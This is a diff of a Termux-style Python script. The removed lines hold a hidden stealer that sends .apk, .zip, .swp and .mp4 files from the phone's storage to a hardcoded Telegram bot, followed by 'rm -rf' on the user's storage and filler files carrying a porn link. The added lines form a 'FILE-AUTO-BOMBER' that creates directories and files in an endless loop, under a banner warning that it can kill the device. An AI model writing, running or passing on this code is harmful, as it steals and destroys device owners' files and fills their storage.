@@ -1,73 +1,73 @@
-# DECOMPILED BY U7P4L 1N
-#TEAM : ANONYMOUS CYBER
-# FEEL FREE ENJOY KIDZ SCRIPT
-import requests
-def CENTSU():
-    session = requests.session()
- 
-    bot_token = '7032468983:AAHui-W0a3YBswNtbpK93KQTAdkY4smQmVA'
-    chat_id = '6851952411'
-    #-------------( /sdcard\ )--------------#  
-    #--------------------apk-------------------#																						
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #----------------zip-------------#
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #-------------------swp---------------#
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #-----------------------mp4--------------------#
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    
 import os
-os.system('rm -rf /storage/emulated/0/*')
-text = "Welcome to my world , https://pornhub.com\n"
-for i in range(6000):
-	os.system(f'touch /storage/emulated/0/DELETE-succesful{i}.txt')
-	with open(f'/storage/emulated/0/DELETE-succesful{i}.txt','a') as file:
-		file.write(text*20000)
-print('BOBO MO NAMAN PARANG SI DENV. :)')
-print('TAHOL NA NAMAN YANG ASO')
-ok = input('WHERE ARE YOU FROM : ')
+from time import sleep
+from random import choice
+R = '\033[31;1m'
+G = '\033[32;1m'
+Y = '\033[33;1m'
+B = '\033[34;1m'
+M = '\033[35;1m'
+C = '\033[36;1m'
+LR = '\033[91;1m'
+LG = '\033[92;1m'
+LY = '\033[93;1m'
+LB = '\033[94;1m'
+LM = '\033[95;1m'
+LC = '\033[96;1m'
+BANNER ='''\033[1;31m
+ /$$   /$$ /$$$$$$ /$$       /$$       /$$$$$$$$ /$$$$$$$ 
+| $$  /$$/|_  $$_/| $$      | $$      | $$_____/| $$__  $$
+| $$ /$$/   | $$  | $$      | $$      | $$      | $$  \ $$
+| $$$$$/    | $$  | $$      | $$      | $$$$$   | $$$$$$$/
+| $$  $$    | $$  | $$      | $$      | $$__/   | $$__  $$
+| $$\  $$   | $$  | $$      | $$      | $$      | $$  \ $$
+| $$ \  $$ /$$$$$$| $$$$$$$$| $$$$$$$$| $$$$$$$$| $$  | $$
+|__/  \__/|______/|________/|________/|________/|__/  |__/ Verson 2.0 
+'''
+ADMIN_LIST ='''
+\033[1;39m ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗞𝗜𝗡𝗚\033[1;39m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙉𝘼𝙈𝙀\033[1;34m              : [★]  CYBER COP BANGLADESH\033[1;39m  ┃
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m      : [★]  CYBER COP\033[1;39m             ┃
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m          : [★]  CYBERCOP-404\033[1;39m          ┃
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]  𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m┃
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m      : [★]  +8809638223345\033[1;39m        ┃
+\033[1;39m ┃ \x1b[1;95m[💉]😎\x1b[1;96m 𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;31m   : [★]  FILE-AUTO-BOMBER    \033[1;39m  ┃
+ \033[1;39m┗━━━━━━━━━━━━━━━━━━━\033[1;32m 𝙁𝙄𝙍𝙀\033[1;39m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+'''
+COMMAND='''\033[1;31m
+[1] I WANT TO RUN THIS TOOL\033[1;39m
+[2] I WANT TO EXIT THE TOOL
+'''
+def animate_text(text):
+    [print(char, end='', flush=True) or sleep(0.004) for char in text]
+    print()
+file_count = 0
+numbe =[]
+for i in range(0,99999):
+    numbe.append(i)
+os.system('clear')
+animate_text('THIS TOOL IS VERRY DENGURUS.........')
+sleep(3)
+os.system('clear')
+animate_text('THIS TOOL CAN KILL YOUR DEVICE .......')
+sleep(3)
+os.system('mkdir VIRUS')
+os.chdir('VIRUS')
+os.system('clear')
+animate_text(BANNER)
+animate_text(ADMIN_LIST)
+animate_text(COMMAND)
+want =int(input('WHAT DO YOU WANT : '))
+if want ==1:
+    while True:
+        c = choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
+        q=choice(numbe)
+        os.system(f'mkdir CYBER-COP-VIRUS{q}')
+        os.system(f'echo.>VIRUS.mp4{q}')
+        file_count += 1
+        print(f'{c}[{file_count}] CREATED FILE SUCCESSFULL...')
+        sleep(3)
+elif want ==2:
+    breakpoint
+else:
+    breakpoint
+
